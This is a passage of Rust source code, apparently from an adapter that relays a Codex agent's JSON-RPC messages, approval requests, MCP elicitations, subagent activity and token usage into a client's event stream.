            let pending = self.pending_requests.remove(&id);
            if let Some(PendingRequest::AttachmentContext { params, delivery_id }) = pending {
                if let Some(error) = value.get("error") {
                    self.fail_file_delivery(describe_rpc_error(error)).await;
                } else if value.get("result").is_none() {
                    self.fail_file_delivery("Codex omitted the attachment context acknowledgement".into()).await;
                } else if self.interrupted {
                    self.events.emit(AgentEvent::TurnCompleted {
                        turn_id: String::new(), status: TurnStatus::Interrupted, usage: None,
                    }).await;
                } else if let Err(error) = self.start_prepared_turn(params, delivery_id).await {
                    self.fail_file_delivery(error).await;
                }
                return;
            }
            if let Some(PendingRequest::Operation{request_id})=&pending {
                self.events.emit(AgentEvent::RuntimeOperationResult{request_id:request_id.clone(),result:value.get("result").cloned(),error:value.get("error").map(describe_rpc_error).or_else(||value.get("result").is_none().then(||"Native operation omitted result".into()))}).await;return;
            }
            if let Some(PendingRequest::RewindApply { checkpoint, mode }) = &pending {
                let checkpoint = checkpoint.clone(); let mode = *mode;
                if let Some(error) = value.get("error") {
                    let message = error.get("message").and_then(Value::as_str).unwrap_or("");
                    let reason = if message.contains("ephemeral") || message.contains("paginated") { RewindFailureReason::Unsupported }
                        else if message.contains("no rollout") { RewindFailureReason::TargetNotFound }
                        else { RewindFailureReason::Other };
                    self.events.emit(AgentEvent::RewindFailed { checkpoint_id:checkpoint, mode, failure:RewindFailure::new(reason,Some(describe_rpc_error(error))) }).await;
                } else {
                    self.active_turn = None;
                    self.events.emit(AgentEvent::RewindCompleted { checkpoint_id:checkpoint, mode:crate::RewindMode::Conversation, prefill:None,
                        prefill_attachments:Vec::new(), later_history:LaterHistory::Truncated, files:None, incomplete:None, undo_token:None }).await;
                }
                return;
            }
            if let Some(PendingRequest::GoalSnapshot) = &pending {
                // A build without goals, or with the feature off, rejects the
                // request; that is simply a thread without a goal.
                match value.pointer("/result/goal") {
                    Some(goal) => {
                        self.events
                            .emit(AgentEvent::GoalUpdated {
                                goal: map_goal(goal),
                            })
                            .await
                    }
                    None => log::debug!("Codex goal snapshot unavailable: {value}"),
                }
                return;
            }
            if let Some(PendingRequest::SubagentMetadata { parent_id }) = &pending {
                if let Some(thread) = value.pointer("/result/thread") {
                    self.update_subagent_metadata(parent_id, thread).await;
                } else {
                    log::warn!("Codex child metadata unavailable for {parent_id}: {value}");
                }
                return;
            }
            if let Some(PendingRequest::Steer { request_id, .. }) = &pending
                && (value.get("error").is_some() || value.get("result").is_none())
            {
                // `expectedTurnId` no longer matches: the turn ended before the
                // steer reached the server, so the input was never enqueued.
                self.events
                    .emit(AgentEvent::SteerRejected {
                        request_id: request_id.clone(),
                    })
                    .await;
            } else if let Some(error) = value.get("error") {
                self.events
                    .emit(AgentEvent::Error {
                        message: format!(
                            "Codex request {} failed: {}",
                            pending_name(pending.as_ref()),
                            describe_rpc_error(error)
                        ),
                        fatal: false,
                    })
                    .await;
                self.fail_rejected_turn_start(pending.as_ref()).await;
            } else if value.get("result").is_none() {
                self.events
                    .emit(AgentEvent::Error {
                        message: format!(
                            "Codex request {} returned no result",
                            pending_name(pending.as_ref())
                        ),
                        fatal: false,
                    })
                    .await;
                self.fail_rejected_turn_start(pending.as_ref()).await;
            } else {
                match pending {
                    Some(PendingRequest::TurnStart {
                        permission,
                        settings,
                    }) => {
                        if let Some(turn_id) =
                            value.pointer("/result/turn/id").and_then(Value::as_str)
                        {
                            self.active_turn.get_or_insert_with(|| turn_id.to_owned());
                        }
                        self.effective_permission = settings
                            .as_ref()
                            .map(effective_permission)
                            .unwrap_or(permission);
                        self.emit_permissions(settings.as_ref()).await;
                    }
                    Some(PendingRequest::Steer { request_id, text }) => {
                        self.pending_steers.push((request_id, text));
                    }
                    Some(PendingRequest::GuardianApproval {
                        request_id,
                        decision,
                    }) => {
                        self.guardian_denials.remove(&request_id);
                        self.events
                            .emit(AgentEvent::ApprovalResolved {
                                request_id,
                                decision,
                            })
                            .await;
                    }
                    _ => {}
                }
            }
        }
    }

    /// Codex echoes user input as a `userMessage` item only once the turn loop
    /// has drained it into the model context. Match the echo's text against
    /// the acknowledged steers (oldest first) rather than assuming FIFO, since
    /// the turn's own prompt echo can land after a fast steer was sent.
    async fn accept_echoed_steer(&mut self, item: &Value) {
        let echoed = user_message_text(item);
        let Some(position) = self
            .pending_steers
            .iter()
            .position(|(_, text)| *text == echoed)
        else {
            return;
        };
        let (request_id, _) = self.pending_steers.remove(position);
        self.events
            .emit(AgentEvent::SteerAccepted { request_id })
            .await;
    }

    /// A `turn/start` the runtime already accepted was rejected by the server
    /// (JSON-RPC error or missing result): no `turn/started` will follow, so no
    /// `turn/completed` ever arrives and the runtime's turn flag would stay set
    /// forever. Synthesize the terminal event the protocol will never send. The
    /// `active_turn` guard keeps a late duplicate response from failing a turn
    /// that did start.
    async fn fail_rejected_turn_start(&mut self, pending: Option<&PendingRequest>) {
        if !matches!(pending, Some(PendingRequest::TurnStart { .. })) || self.active_turn.is_some()
        {
            return;
        }
        self.clear_retry().await;
        self.events
            .emit(AgentEvent::TurnCompleted {
                turn_id: String::new(),
                status: TurnStatus::Failed,
                usage: None,
            })
            .await;
    }

    async fn handle_server_request(&mut self, value: &Value) {
        let method = value
            .get("method")
            .and_then(Value::as_str)
            .unwrap_or_default();
        let id = value.get("id").cloned().unwrap_or(Value::Null);
        let key = request_id_string(&id);
        let params = value.get("params").unwrap_or(&Value::Null);
        let turn_id = params
            .get("turnId")
            .and_then(Value::as_str)
            .map(str::to_owned);
        let item_id = params
            .get("itemId")
            .and_then(Value::as_str)
            .unwrap_or_default();

        // Structured user-input request: map to a canonical UserInputRequested
        // and remember the JSON-RPC id so RespondUserInput can reply.
        if method == "item/tool/requestUserInput" {
            let questions = parse_codex_user_input(params);
            self.user_inputs.insert(key.clone(), id);
            self.events
                .emit(AgentEvent::UserInputRequested {
                    request_id: key,
                    questions,
                    delivery: UserInputDelivery::Blocking,
                })
                .await;
            return;
        }

        if method == "mcpServer/elicitation/request" {
            self.handle_elicitation_request(key, id, params).await;
            return;
        }

        let kind = match method {
            "item/commandExecution/requestApproval" | "execCommandApproval" => {
                ApprovalKind::ExecCommand {
                    command: shell_script(&string_field(params, "command")),
                    cwd: params.get("cwd").and_then(Value::as_str).map(str::to_owned),
                    reason: params
                        .get("reason")
                        .and_then(Value::as_str)
                        .map(str::to_owned),
                }
            }
            "item/fileChange/requestApproval" | "applyPatchApproval" => ApprovalKind::FileChange {
                changes: self
                    .items
                    .get(item_id)
                    .and_then(|item| match &item.content {
                        ItemContent::FileChange { changes, .. } => Some(changes.clone()),
                        _ => None,
                    })
                    .unwrap_or_default(),
                reason: params
                    .get("reason")
                    .and_then(Value::as_str)
                    .map(str::to_owned),
            },
            "item/permissions/requestApproval" => ApprovalKind::ToolUse {
                name: "request_permissions".into(),
                input: params.get("permissions").cloned().unwrap_or(Value::Null),
                detail: params
                    .get("reason")
                    .and_then(Value::as_str)
                    .unwrap_or("Grant requested permissions")
                    .into(),
            },
            _ => {
                let _ = send_json(
                    &mut self.stdin,
                    &json!({ "id": id, "error": { "code": -32601, "message": format!("unsupported server request: {method}") } }),
                );
                self.events
                    .emit(AgentEvent::Warning {
                        message: format!("unsupported Codex server request: {method}"),
                    })
                    .await;
                return;
            }
        };
        let (options, replies, cancel_reply) = approval_choices(method, params);
        self.approvals.insert(
            key.clone(),
            PendingApproval {
                rpc_id: id,
                replies,
                cancel_reply,
                cancel_interrupt: (method == "item/permissions/requestApproval").then(
                    || json!({"threadId":params.get("threadId"),"turnId":params.get("turnId")}),
                ),
            },
        );
        self.events
            .emit(AgentEvent::ApprovalRequested(ApprovalRequest {native_execution: Some(json!({"tool_name":method,"arguments":params,"action":match &kind{ApprovalKind::ExecCommand{..}=>"command_execution",ApprovalKind::FileChange{..}=>"file_change",_ if method=="item/permissions/requestApproval"=>"permissions",_=>"tool"},"resource_kind":match &kind{ApprovalKind::ExecCommand{..}=>"process",ApprovalKind::FileChange{..}=>"file",_ if method=="item/permissions/requestApproval"=>"file",_=>"mcp"},"cwd":params["cwd"].as_str().or_else(||params["workdir"].as_str()).unwrap_or("")})), tool_call_id: params["itemId"].as_str().map(str::to_owned),
                id: key,
                parent_item_id: None,
                turn_id,
                kind,
                options,
            }))
            .await;
    }

    async fn handle_elicitation_request(
        &mut self,
        request_id: String,
        rpc_id: Value,
        params: &Value,
    ) {
        let server_name = params
            .get("serverName")
            .and_then(Value::as_str)
            .filter(|name| !name.is_empty())
            .unwrap_or("MCP");
        let mode = params
            .get("mode")
            .and_then(Value::as_str)
            .unwrap_or("unknown");

        if mode == "form"
            && params
                .pointer("/requestedSchema/properties")
                .and_then(Value::as_object)
                .is_some_and(|fields| fields.is_empty())
        {
            let mut choices = vec![(
                "accept".to_owned(),
                "Allow once".to_owned(),
                ApprovalOptionKind::AllowOnce,
                json!({"action":"accept", "content":{}}),
            )];
            if let Some(scopes) = params.pointer("/_meta/persist").and_then(Value::as_array) {
                for scope in scopes.iter().filter_map(Value::as_str) {
                    let label = match scope {
                        "session" => "Allow for this session",
                        "always" => "Always allow",
                        _ => continue,
                    };
                    choices.push((
                        format!("accept:{scope}"),
                        label.into(),
                        ApprovalOptionKind::AllowAlways,
                        json!({"action":"accept", "content":{}, "_meta":{"persist":scope}}),
                    ));
                }
            }
            choices.push((
                "decline".into(),
                "Decline".into(),
                ApprovalOptionKind::RejectOnce,
                json!({"action":"decline"}),
            ));
            let options = choices
                .iter()
                .map(|(id, label, kind, _)| ApprovalOption {
                    id: id.clone(),
                    label: label.clone(),
                    kind: *kind,
                })
                .collect();
            let replies = choices
                .into_iter()
                .map(|(id, _, _, reply)| (id, reply))
                .collect();
            self.approvals.insert(
                request_id.clone(),
                PendingApproval {
                    rpc_id,
                    replies,
                    cancel_reply: json!({"action":"cancel"}),
                    cancel_interrupt: None,
                },
            );
            let tool_call_id = params.pointer("/_meta/tool_call_id")
                .or_else(|| params.get("itemId"))
                .and_then(Value::as_str)
                .map(str::to_owned)
                .or_else(|| {
                    let prefix = format!("{server_name}/");
                    let mut matches = self.current_turn_items.iter().filter(|id| {
                        self.items.get(*id).is_some_and(|item| matches!(
                            &item.content,
                            ItemContent::ToolCall { name, status: ItemStatus::InProgress, .. }
                                if name.starts_with(&prefix)
                        ))
                    });
                    let only = matches.next()?.clone();
                    matches.next().is_none().then_some(only)
                });
            self.events
                .emit(AgentEvent::ApprovalRequested(ApprovalRequest {native_execution: Some(json!({"tool_name":params.pointer("/_meta/tool_name").and_then(Value::as_str).unwrap_or(server_name),"arguments":params.pointer("/_meta/tool_params").cloned().unwrap_or(Value::Null),"action":"mcp_tool_call","resource_kind":"mcp","cwd":params["cwd"].as_str().unwrap_or("")})), tool_call_id,
                    id: request_id,
                    parent_item_id: None,
                    turn_id: params
                        .get("turnId")
                        .and_then(Value::as_str)
                        .map(str::to_owned),
                    kind: ApprovalKind::ToolUse {
                        name: server_name.into(),
                        input: params
                            .pointer("/_meta/tool_params")
                            .cloned()
                            .unwrap_or(Value::Null),
                        detail: params
                            .get("message")
                            .and_then(Value::as_str)
                            .unwrap_or("MCP approval")
                            .into(),
                    },
                    options,
                }))
                .await;
            return;
        }

        let parsed = match mode {
            "form" => parse_elicitation_form(params, server_name),
            "url" => Some(parse_elicitation_url(params, server_name)),
            _ => None,
        };

        let Some((questions, fields)) = parsed.filter(|(questions, _)| !questions.is_empty())
        else {
            let _ = send_json(
                &mut self.stdin,
                &json!({ "id": rpc_id, "result": { "action": "decline" } }),
            );
            let message = if mode == "form" {
                format!(
                    "codex: MCP server {server_name} sent an elicitation with no supported fields; declined"
                )
            } else {
                format!(
                    "codex: MCP server {server_name} sent an unsupported \"{mode}\" elicitation; declined"
                )
            };
            self.events.emit(AgentEvent::Warning { message }).await;
            return;
        };

        self.elicitations
            .insert(request_id.clone(), PendingElicitation { rpc_id, fields });
        self.events
            .emit(AgentEvent::UserInputRequested {
                request_id,
                questions,
                delivery: UserInputDelivery::Blocking,
            })
            .await;
    }

    async fn handle_notification(&mut self, method: &str, params: &Value) {
        if matches!(
            method,
            "item/autoApprovalReview/started" | "item/autoApprovalReview/completed"
        ) {
            self.handle_auto_review(params).await;
            return;
        }
        let thread_id = params.get("threadId").and_then(Value::as_str);
        let is_child = thread_id.is_some_and(|id| id != self.thread_id);
        if let Some(activity) = find_subagent_activity(params) {
            self.handle_subagent_activity(activity).await;
            return;
        }
        if is_child {
            // Child snapshots belong in the subagent mirror. Keep their lifecycle,
            // deltas and usage out of the parent turn and its item cache.
            if matches!(method, "item/started" | "item/updated" | "item/completed")
                && let Some(value) = params.get("item")
                && !matches!(
                    value.get("type").and_then(Value::as_str),
                    Some("contextCompaction")
                )
                && let Some(mut item) = map_child_item(value)
            {
                self.capture_read_image(&mut item).await;
                let thread_id = thread_id.expect("child notification has a thread id");
                let parent_id = self
                    .subagent_parent_by_thread
                    .entry(thread_id.to_owned())
                    .or_insert_with(|| format!("codex-subagent:{thread_id}"));
                item.parent_item_id = Some(parent_id.clone());
                let event = match method {
                    "item/started" => AgentEvent::ItemStarted(item),
                    "item/updated" => AgentEvent::ItemUpdated(item),
                    _ => AgentEvent::ItemCompleted(item),
                };
                self.events.emit(event).await;
            }
            return;
        }
        match method {
            "thread/settings/updated" => {
                if let Some(settings) = params.get("threadSettings") {
                    if let Some(PendingRequest::TurnStart {
                        settings: pending, ..
                    }) = self
                        .pending_requests
                        .values_mut()
                        .find(|request| matches!(request, PendingRequest::TurnStart { .. }))
                    {
                        *pending = Some(settings.clone());
                    } else {
                        self.effective_permission = effective_permission(settings);
                        self.emit_permissions(Some(settings)).await;
                    }
                }
            }
            "turn/started" => {
                if let Some(id) = params.pointer("/turn/id").and_then(Value::as_str) {
                    self.active_turn = Some(id.into());
                    self.current_turn_items.clear();
                    self.retry = None;
                    self.retry_deadline = None;
                    if self.interrupted {
                        let _ = self.request(
                            "turn/interrupt",
                            json!({"threadId":self.thread_id,"turnId":id}),
                            PendingRequest::Interrupt,
                        );
                    }
                    self.events
                        .emit(AgentEvent::TurnStarted { turn_id: id.into() })
                        .await;
                    self.events.emit(AgentEvent::TurnCheckpoint{turn_id:id.into(),checkpoint_id:id.into()}).await;
                }
            }
            "turn/completed" => {
                let turn = params.get("turn").unwrap_or(&Value::Null);
                let id = turn
                    .get("id")
                    .and_then(Value::as_str)
                    .unwrap_or_default()
                    .to_owned();
                let status = match turn.get("status").and_then(Value::as_str) {
                    Some("interrupted") => TurnStatus::Interrupted,
                    Some("failed") => TurnStatus::Failed,
                    _ => TurnStatus::Completed,
                };
                if status == TurnStatus::Failed
                    && !self.interrupted
                    && turn
                        .pointer("/error/codexErrorInfo")
                        .and_then(Value::as_str)
                        == Some("serverOverloaded")
                {
                    // Codex App retries overload failures with empty input at these intervals.
                    // app-server ends the native turn instead of scheduling this continuation.
                    let delay = [10, 30, 120, 300].get(self.capacity_retries).copied();
                    self.capacity_retries = self.capacity_retries.saturating_add(1);
                    self.retry_deadline = delay.map(|seconds| {
                        std::time::Instant::now() + std::time::Duration::from_secs(seconds)
                    });
                    self.retry = Some(crate::TurnRetry {
                        turn_id: id.clone(),
                        retry_at: delay.map(|seconds| {
                            std::time::SystemTime::now()
                                .duration_since(std::time::UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_secs()
                                + seconds
                        }),
                    });
                    self.events
                        .emit(AgentEvent::TurnRetry {
                            retry: self.retry.clone(),
                        })
                        .await;
                } else {
                    self.clear_retry().await;
                    self.capacity_retries = 0;
                }
                self.active_turn = None;
                self.async_questions = None;
                let usage = self.usage_by_turn.remove(&id);
                self.usage_totals_by_turn.remove(&id);
                self.events
                    .emit(AgentEvent::TurnCompleted {
                        turn_id: id,
                        status,
                        usage,
                    })
                    .await;
            }
            "turn/diff/updated" => {
                let turn_id = notification_turn_id(params, &self.active_turn).unwrap_or_default();
                let diff = params
                    .get("diff")
                    .and_then(Value::as_str)
                    .unwrap_or_default();
                match file_changes_from_unified_diff(diff) {
                    Ok(changes) => {
                        self.events
                            .emit(AgentEvent::TurnChangesUpdated {
                                turn_id,
                                changes,
                                completeness: ChangeCompleteness::Exact,
                            })
                            .await;
                    }
                    Err(err) => {
                        self.events
                            .emit(AgentEvent::Warning {
                                message: format!("Codex supplied an invalid turn diff: {err}"),
                            })
                            .await;
                    }
                }
            }
            "item/started" | "item/updated" | "item/completed" => {
                let item_value = params.get("item");
                match item_value
                    .and_then(|item| item.get("type"))
                    .and_then(Value::as_str)
                {
                    Some("userMessage") => {
                        if let Some(item) = item_value {
                            self.accept_echoed_steer(item).await;
                        }
                        return;
                    }
                    Some("contextCompaction") => {
                        if method == "item/started" {
                            self.events
                                .emit(AgentEvent::ContextCompacted(crate::Compaction {
                                    in_progress: true,
                                    ..Default::default()
                                }))
                                .await;
                        } else if method == "item/completed" {
                            self.restore_instructions();
                            self.events
                                .emit(AgentEvent::ContextCompacted(Default::default()))
                                .await;
                        }
                        return;
                    }
                    _ => {}
                }
                if let Some(mut item) = item_value.and_then(map_item) {
                    self.capture_read_image(&mut item).await;
                    if method == "item/started" {
                        self.current_turn_items.insert(item.id.clone());
                    } else if method == "item/completed" {
                        self.current_turn_items.remove(&item.id);
                    }
                    if let Some(subagent) = self.subagents.get(&item.id) {
                        let status = if method == "item/completed" {
                            item_status(&item.content)
                        } else {
                            ItemStatus::InProgress
                        };
                        let summary = if method == "item/completed" {
                            item_summary(&item.content)
                        } else {
                            None
                        };
                        item.content = ItemContent::Subagent {
                            agent_type: subagent.agent_type.clone(),
                            description: subagent.description.clone(),
                            status,
                            summary: summary.clone(),
                            model: subagent.model.clone(),
                            effort: subagent.effort.clone(),
                        };
                        if method == "item/completed" {
                            self.events
                                .emit(AgentEvent::ItemCompleted(ThreadItem {
                                    id: subagent.child_item_id.clone(),
                                    parent_item_id: Some(item.id.clone()),
                                    content: ItemContent::Subagent {
                                        agent_type: subagent.agent_type.clone(),
                                        description: "child thread".into(),
                                        status,
                                        summary,
                                        model: subagent.model.clone(),
                                        effort: subagent.effort.clone(),
                                    },
                                }))
                                .await;
                        }
                    }
                    self.items.insert(item.id.clone(), item.clone());
                    let event = match method {
                        "item/started" => AgentEvent::ItemStarted(item),
                        "item/updated" => AgentEvent::ItemUpdated(item),
                        _ => AgentEvent::ItemCompleted(item),
                    };
                    self.events.emit(event).await;
                }
                if method == "item/completed"
                    && let Some(item) = item_value
                {
                    self.request_async_questions(item).await;
                }
            }
            "turn/plan/updated" => {
                let turn_id = notification_turn_id(params, &self.active_turn);
                let explanation = params
                    .get("explanation")
                    .and_then(Value::as_str)
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .map(str::to_owned);
                let steps = params
                    .get("plan")
                    .and_then(Value::as_array)
                    .map(|steps| steps.iter().map(map_plan_step).collect())
                    .unwrap_or_default();
                self.events
                    .emit(AgentEvent::PlanUpdated {
                        turn_id,
                        explanation,
                        steps,
                    })
                    .await;
            }
            "item/plan/delta" | "item/agentMessage/delta" => {
                self.emit_delta(params, DeltaKind::AssistantText).await
            }
            "item/reasoning/summaryTextDelta" | "item/reasoning/textDelta" => {
                self.emit_delta(params, DeltaKind::ReasoningText).await
            }
            "item/commandExecution/outputDelta" | "command/exec/outputDelta" => {
                self.emit_delta(params, DeltaKind::CommandOutput).await
            }
            "thread/tokenUsage/updated" => {
                if let Some(usage) = map_usage(params.get("tokenUsage").unwrap_or(&Value::Null)) {
                    if let Some(turn_id) = params.get("turnId").and_then(Value::as_str) {
                        let totals = params["tokenUsage"]["total"].clone();
                        let mut aggregate = usage;
                        if let (Some(previous), Some(accumulated)) = (
                            self.usage_totals_by_turn.get(turn_id),
                            self.usage_by_turn.get(turn_id),
                        ) {
                            // `last` describes one model call, not the whole agent turn.
                            // Cumulative counter differences also deduplicate repeated notifications.
                            let add = |count: Option<u64>, key: &str| {
                                count?.checked_add(totals[key].as_u64()?.checked_sub(previous[key].as_u64()?)?)
                            };
                            aggregate.input_tokens = add(accumulated.input_tokens, "inputTokens");
                            aggregate.output_tokens = add(accumulated.output_tokens, "outputTokens");
                            aggregate.cached_input_tokens = add(accumulated.cached_input_tokens, "cachedInputTokens");
                            aggregate.reasoning_tokens = add(accumulated.reasoning_tokens, "reasoningOutputTokens");
                        }
                        aggregate.turn_processed_tokens = aggregate.input_tokens.zip(aggregate.output_tokens)
                            .and_then(|(input, output)| input.checked_add(output));
                        self.usage_by_turn.insert(turn_id.into(), aggregate);
                        self.usage_totals_by_turn.insert(turn_id.into(), totals);
                    }
                    self.events.emit(AgentEvent::TokenUsage(usage)).await;
                }
            }
            "model/rerouted" => {
                if let Some((model, reason)) = model_reroute(params) {
                    self.events
                        .emit(AgentEvent::ServedModel { model, reason })
                        .await;
                }
            }
            "error" => {
                // No message field → show the raw notification: a summary like
                // "unknown error" leaves nothing to diagnose with.
                let message = params
                    .pointer("/error/message")
                    .and_then(Value::as_str)
                    .map(str::to_owned)
                    .unwrap_or_else(|| format!("Codex reported an error: {params}"));
                let fatal = !params
                    .get("willRetry")
                    .and_then(Value::as_bool)
                    .unwrap_or(false);
                self.events.emit(AgentEvent::Error { message, fatal }).await;
            }
            "warning" | "configWarning" | "deprecationNotice" => {
                if let Some(message) = params.get("message").and_then(Value::as_str) {
                    self.events
                        .emit(AgentEvent::Warning {
                            message: message.into(),
                        })
                        .await;
                }
            }
            "thread/goal/updated" => {
                if let Some(goal) = params.get("goal").and_then(map_goal) {
                    self.events
                        .emit(AgentEvent::GoalUpdated { goal: Some(goal) })
                        .await;
                }
            }
            "thread/goal/cleared" => {
                self.events
                    .emit(AgentEvent::GoalUpdated { goal: None })
                    .await;
            }
            "thread/closed" => {
                self.events
                    .emit(AgentEvent::Warning {
                        message: "Codex thread was closed by the server".into(),
                    })
                    .await;
            }
            _ => log::trace!("ignored Codex notification {method}: {params}"),
        }
    }

    async fn handle_subagent_activity(&mut self, activity: &Value) {
        let Some(activity_id) = activity
            .get("event_id")
            .or_else(|| activity.get("id"))
            .and_then(Value::as_str)
        else {
            return;
        };
        let Some(thread_id) = activity
            .get("agent_thread_id")
            .or_else(|| activity.get("agentThreadId"))
            .and_then(Value::as_str)
        else {
            return;
        };
        // Codex 0.154 also reports the root thread's own activity (`agentPath`
        // "/root"); that is not a child and would otherwise become a capsule
        // that never completes.
        if thread_id == self.thread_id {
            return;
        }
        let kind = activity
            .get("kind")
            .and_then(Value::as_str)
            .unwrap_or("started");
        let dedupe_key = format!("{activity_id}\0{thread_id}\0{kind}");
        if !self.seen_subagent_activities.insert(dedupe_key) {
            return;
        }
        let parent_id = if kind == "started" {
            self.subagent_parent_by_thread
                .entry(thread_id.to_owned())
                .or_insert_with(|| activity_id.to_owned())
                .clone()
        } else {
            self.subagent_parent_by_thread
                .entry(thread_id.to_owned())
                .or_insert_with(|| format!("codex-subagent:{thread_id}"))
                .clone()
        };
        let path = activity
            .get("agent_path")
            .or_else(|| activity.get("agentPath"))
            .and_then(Value::as_str)
            .unwrap_or("subagent");
        let spawn_input = self
            .items
            .get(&parent_id)
            .or_else(|| self.items.get(activity_id))
            .and_then(|item| match &item.content {
                ItemContent::ToolCall { input, .. } => Some(input),
                _ => None,
            });
        let (agent_type, description) = spawn_input
            .map(|input| {
                (
                    input
                        .get("agent_type")
                        .or_else(|| input.get("subagent_type"))
                        .and_then(Value::as_str)
                        .unwrap_or_else(|| path.rsplit('/').next().unwrap_or("subagent"))
                        .to_owned(),
                    input
                        .get("description")
                        .or_else(|| input.get("prompt"))
                        .and_then(Value::as_str)
                        .unwrap_or(path)
                        .to_owned(),
                )
            })
            .unwrap_or_else(|| {
                (
                    path.rsplit('/').next().unwrap_or("subagent").to_owned(),
                    path.to_owned(),
                )
            });
        // Activity notifications can arrive without a spawn ToolCall. Missing
        // arguments do not establish inheritance; read the child's own metadata.
        let override_str = |key: &str| {
            spawn_input
                .and_then(|input| input.get(key))
                .and_then(Value::as_str)
                .filter(|text| !text.is_empty())
                .map(str::to_owned)
        };
        let model = override_str("model");
        let effort = override_str("reasoning_effort").or_else(|| override_str("reasoningEffort"));
        let child_item_id = format!("{parent_id}:{thread_id}");
        let needs_metadata = !self.subagents.contains_key(&parent_id);
        let subagent = self
            .subagents
            .entry(parent_id.clone())
            .or_insert_with(|| CodexSubagent {
                agent_type,
                description,
                child_item_id,
                model,
                effort,
            })
            .clone();
        let status = match kind {
            "completed" => ItemStatus::Completed,
            "interrupted" => ItemStatus::Interrupted,
            // Messaging a finished child does not start another turn; only a
            // started activity establishes that it owns work again.
            "interacted" => self
                .items
                .get(&parent_id)
                .map(|item| item_status(&item.content))
                .unwrap_or(ItemStatus::InProgress),
            _ => ItemStatus::InProgress,
        };
        let parent = ThreadItem {
            id: parent_id.clone(),
            parent_item_id: None,
            content: ItemContent::Subagent {
                agent_type: subagent.agent_type.clone(),
                description: subagent.description.clone(),
                status,
                summary: None,
                model: subagent.model.clone(),
                effort: subagent.effort.clone(),
            },
        };
        self.items.insert(parent_id.clone(), parent.clone());
        let parent_event = if status == ItemStatus::InProgress {
            AgentEvent::ItemUpdated(parent)
        } else {
            AgentEvent::ItemCompleted(parent)
        };
        self.events.emit(parent_event).await;

        let child = ThreadItem {
            id: subagent.child_item_id,
            parent_item_id: Some(parent_id.clone()),
            content: ItemContent::Subagent {
                agent_type: subagent.agent_type,
                description: match kind {
                    "interacted" => "interacted with parent".into(),
                    "completed" => "child thread completed".into(),
                    "interrupted" => "child thread interrupted".into(),
                    _ => "child thread started".into(),
                },
                status,
                summary: None,
                model: subagent.model,
                effort: subagent.effort,
            },
        };
        let event = match kind {
            "started" => AgentEvent::ItemStarted(child),
            "completed" | "interrupted" => AgentEvent::ItemCompleted(child),
            _ => AgentEvent::ItemUpdated(child),
        };
        self.events.emit(event).await;
        if needs_metadata
            && let Err(error) = self.request(
                "thread/read",
                json!({ "threadId": thread_id, "includeTurns": false }),
                PendingRequest::SubagentMetadata { parent_id },
            )
        {
            log::warn!("Could not read Codex child metadata: {error}");
        }
    }

    async fn update_subagent_metadata(&mut self, parent_id: &str, thread: &Value) {
        let Some(subagent) = self.subagents.get_mut(parent_id) else {
            return;
        };
        subagent.model = thread
            .get("model")
            .and_then(Value::as_str)
            .map(str::to_owned);
        subagent.effort = thread
            .get("reasoningEffort")
            .and_then(Value::as_str)
            .map(str::to_owned);
        let Some(parent) = self.items.get_mut(parent_id) else {
            return;
        };
        let ItemContent::Subagent { model, effort, .. } = &mut parent.content else {
            return;
        };
        model.clone_from(&subagent.model);
        effort.clone_from(&subagent.effort);
        let mut child = parent.clone();
        child.id.clone_from(&subagent.child_item_id);
        child.parent_item_id = Some(parent_id.to_owned());
        if let ItemContent::Subagent {
            description,
            status,
            ..
        } = &mut child.content
        {
            *description = match status {
                ItemStatus::InProgress => "child thread started",
                ItemStatus::Completed => "child thread completed",
                ItemStatus::Interrupted => "child thread interrupted",
                _ => "child thread",
            }
            .into();
        }
        // A metadata reply can follow completion. Update both labels without
        // reopening the child or replacing its terminal status and summary.
        self.events
            .emit(AgentEvent::ItemUpdated(parent.clone()))
            .await;
        self.events.emit(AgentEvent::ItemUpdated(child)).await;
    }

    /// Deliver `request_user_input_async` answers into the running turn. The
    /// model reads them like any steer, so the reply is a `turn/steer` whose
    /// text is Codex's own question-reply envelope; the timeline shows the
    /// same plain rendering the Codex TUI uses for that envelope.
    async fn steer_async_question_reply(
        &mut self,
        request_id: &str,
        questions: &[UserInputQuestion],
        answers: &serde_json::Map<String, Value>,
    ) -> Result<(), String> {
        let Some((wire, display)) = async_question_reply(questions, answers) else {
            return Ok(());
        };
        let Some(turn_id) = self.active_turn.clone() else {
            self.events
                .emit(AgentEvent::Warning {
                    message: "cannot answer: the Codex turn that asked has ended".into(),
                })
                .await;
            return Ok(());
        };
        let steer_id = format!("codex-question-reply-{request_id}");
        self.events
            .emit(AgentEvent::SteerRequested {
                request_id: steer_id.clone(),
                text: display,
                attachments: Vec::new(),
            })
            .await;
        let thread_id = self.thread_id.clone();
        self.request(
            "turn/steer",
            json!({
                "threadId": thread_id,
                "expectedTurnId": turn_id,
                "input": user_input(&wire, &[]),
            }),
            PendingRequest::Steer {
                request_id: steer_id,
                text: wire,
            },
        )
    }

    /// A completed `agentMessage` carrying `questions` is the
    /// `request_user_input_async` tool's output: the message text already
    /// lists the questions, and the turn keeps running. Open questions of the
    /// turn accumulate under one request so a later ask does not hide an
    /// earlier unanswered one.
    async fn request_async_questions(&mut self, item: &Value) {
        if item.get("type").and_then(Value::as_str) != Some("agentMessage") {
            return;
        }
        let Some(message_id) = item.get("id").and_then(Value::as_str) else {
            return;
        };
        let questions = parse_codex_async_questions(message_id, item);
        if questions.is_empty() {
            return;
        }
        let mut open = self
            .async_questions
            .take()
            .map(|(_, questions)| questions)
            .unwrap_or_default();
        open.extend(questions);
        self.async_questions = Some((message_id.to_owned(), open.clone()));
        self.events
            .emit(AgentEvent::UserInputRequested {
                request_id: message_id.to_owned(),
                questions: open,
                delivery: UserInputDelivery::Async,
            })
            .await;
    }

    /// Settle every outstanding native user-input request and MCP elicitation
    /// on teardown, replying with the protocol's empty/cancel outcome.
    async fn settle_pending_user_inputs_on_shutdown(&mut self) {
        let pending = self
            .user_inputs
            .drain()
            .map(|(request_id, rpc_id)| (request_id, rpc_id, json!({ "answers": {} })))
            .chain(self.elicitations.drain().map(|(request_id, pending)| {
                (request_id, pending.rpc_id, json!({ "action": "cancel" }))
            }));
        for (request_id, rpc_id, result) in pending {
            let _ = send_json(&mut self.stdin, &json!({ "id": rpc_id, "result": result }));
            self.events
                .emit(AgentEvent::UserInputResolved {
                    request_id,
                    answers: serde_json::Map::new(),
                })
                .await;
        }
    }

    async fn emit_delta(&self, params: &Value, kind: DeltaKind) {
        if let (Some(item_id), Some(text)) = (
